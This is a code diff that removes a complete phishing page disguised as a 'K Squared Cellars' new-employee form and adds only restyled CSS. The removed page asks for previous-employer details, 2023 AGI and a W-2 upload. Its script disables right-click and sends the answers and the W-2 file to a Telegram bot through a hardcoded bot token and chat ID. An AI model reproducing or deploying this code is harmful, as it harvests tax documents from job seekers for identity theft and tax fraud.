@@ -1,196 +1,97 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>K Squared Cellars – Previous Employment Info</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: url('https://i.imgur.com/4pYTPl3.png') no-repeat center center fixed;
-      background-size: cover;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      min-height: 100vh;
-    }
-    .upload-container {
-      background: rgba(255, 255, 255, 0.95);
-      padding: 20px;
-      margin-top: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 360px;
-    }
-    h2 {
-      text-align: center;
-      color: #333;
-      margin-top: 0;
-      font-size: 18px;
-    }
-    .form-group {
-      margin-bottom: 12px;
-    }
-    label {
-      font-weight: bold;
-      display: block;
-      margin-bottom: 4px;
-      font-size: 14px;
-    }
-    input[type="text"],
-    input[type="number"],
-    input[type="file"],
-    select {
-      width: 100%;
-      padding: 7px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background-color: #673ab7;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-size: 15px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #5e35b1;
-    }
-    .success {
-      margin-top: 12px;
-      text-align: center;
-      color: green;
-      font-size: 14px;
-    }
-    .notice {
-      font-size: 12px;
-      color: #555;
-      margin-bottom: 15px;
-    }
-    .notice h3 {
-      font-size: 16px;
-      margin-top: 0;
-    }
-  </style>
-</head>
-<body oncontextmenu="return false;">
-  <div class="upload-container">
-    <h2>K Squared Cellars – Previous Employment Info</h2>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: url('https://i.imgur.com/4pYTPl3.png') no-repeat center center fixed;
+    background-size: cover;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    font-size: 16px; /* increased base font size */
+    color: #222;
+  }
 
-    <div class="notice">
-      <h3>Previous Employer Information</h3>
-      <p>Share your experience by providing your previous information.</p>
-      <p><strong>NEW EMPLOYEE NOTICE:</strong></p>
-      <p>
-        Full previous employment history is needed. Whether you work as a full-time or part-time employee, your employer has to provide you with a Form W-2 at the end of each tax year. To know your starting salary record history with your previous employers, such as:
-      </p>
-      <ul>
-        <li>Start Date</li>
-        <li>End Date</li>
-        <li>Starting Salary</li>
-      </ul>
-      <p>
-        Did you file a tax return with the Internal Revenue Service (IRS) last year?
-      </p>
-      <p>Yes<br/>Enter 2023 AGI:<br/>No<br/>Enter 0</p>
-      <p><strong>Click or Tap Here to Upload your previous W-2 *</strong></p>
-      <p><em>Note: Regarding background information please read carefully. Your present employer will not be contacted unless you give specific permission to do so.</em></p>
-      <p>Our chat support team are available 8am - 6pm Eastern Standard Time (Monday - Friday).</p>
-    </div>
+  .upload-container {
+    background: rgba(255, 255, 255, 0.97);
+    padding: 22px;
+    margin-top: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 14px rgba(0,0,0,0.1);
+    width: 380px;
+  }
 
-    <form id="employmentForm">
-      <div class="form-group">
-        <label for="previousEmployer">Previous Employer Name</label>
-        <input type="text" id="previousEmployer" name="previousEmployer" required />
-      </div>
-      <div class="form-group">
-        <label for="jobTitle">Job Title</label>
-        <input type="text" id="jobTitle" name="jobTitle" required />
-      </div>
-      <div class="form-group">
-        <label for="employmentStart">Employment Start Year</label>
-        <input type="number" id="employmentStart" name="employmentStart" min="1900" max="2099" required />
-      </div>
-      <div class="form-group">
-        <label for="employmentEnd">Employment End Year</label>
-        <input type="number" id="employmentEnd" name="employmentEnd" min="1900" max="2099" required />
-      </div>
-      <div class="form-group">
-        <label for="agi">2023 AGI (Enter 0 if not filed)</label>
-        <input type="number" id="agi" name="agi" min="0" step="0.01" required />
-      </div>
-      <div class="form-group">
-        <label for="w2Upload">Upload Your Last W-2</label>
-        <input type="file" id="w2Upload" name="w2Upload" accept=".jpg,.jpeg,.png,.pdf" required />
-      </div>
-      <button type="submit">Next</button>
-      <div class="success" id="successMessage"></div>
-    </form>
-  </div>
+  h2 {
+    text-align: center;
+    color: #333;
+    margin-top: 0;
+    font-size: 20px;
+  }
 
-  <script>
-    document.addEventListener('contextmenu', event => event.preventDefault());
+  .form-group {
+    margin-bottom: 15px;
+  }
 
-    document.getElementById("employmentForm").addEventListener("submit", async function(e) {
-      e.preventDefault();
+  label {
+    font-weight: bold;
+    display: block;
+    margin-bottom: 6px;
+    font-size: 15px; /* increased */
+  }
 
-      const previousEmployer = document.getElementById("previousEmployer").value.trim();
-      const jobTitle = document.getElementById("jobTitle").value.trim();
-      const employmentStart = document.getElementById("employmentStart").value.trim();
-      const employmentEnd = document.getElementById("employmentEnd").value.trim();
-      const agi = document.getElementById("agi").value.trim();
-      const w2File = document.getElementById("w2Upload").files[0];
+  input[type="text"],
+  input[type="number"],
+  input[type="file"],
+  select {
+    width: 100%;
+    padding: 8px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    font-size: 15px;
+  }
 
-      if (!w2File) {
-        alert("Please upload your last W-2 document.");
-        return;
-      }
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: #673ab7;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+  }
 
-      const telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
-      const telegram_chat_id = "1461764555";
+  button:hover {
+    background-color: #5e35b1;
+  }
 
-      const message = `
-📄 *K Squared Cellars - Previous Employment Submission*
-——————————————
-🏢 Previous Employer: ${previousEmployer}
-💼 Job Title: ${jobTitle}
-📅 Employment Period: ${employmentStart} - ${employmentEnd}
-💵 2023 AGI: $${agi}
-🕒 Time: ${new Date().toLocaleString()}
-——————————————
-`;
+  .success {
+    margin-top: 12px;
+    text-align: center;
+    color: green;
+    font-size: 14px;
+  }
 
-      // Send text message
-      await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: telegram_chat_id,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      });
+  .notice {
+    font-size: 16px;
+    color: #333;
+    margin-bottom: 20px;
+    line-height: 1.6;
+  }
 
-      // Send file
-      const formData = new FormData();
-      formData.append("chat_id", telegram_chat_id);
-      formData.append("document", w2File, w2File.name);
-      formData.append("caption", `${previousEmployer} - Last W-2`);
+  .notice h3 {
+    font-size: 17px;
+    margin-top: 0;
+    font-weight: bold;
+  }
 
-      await fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendDocument`, {
-        method: "POST",
-        body: formData
-      });
+  .notice ul {
+    padding-left: 18px;
+    margin-top: 5px;
+  }
 
-      // Redirect to next page
-      window.location.href = "previous_employment.html";
-    });
-  </script>
-</body>
-</html>
+  .notice li {
+    margin-bottom: 6px;
+  }
+</style>
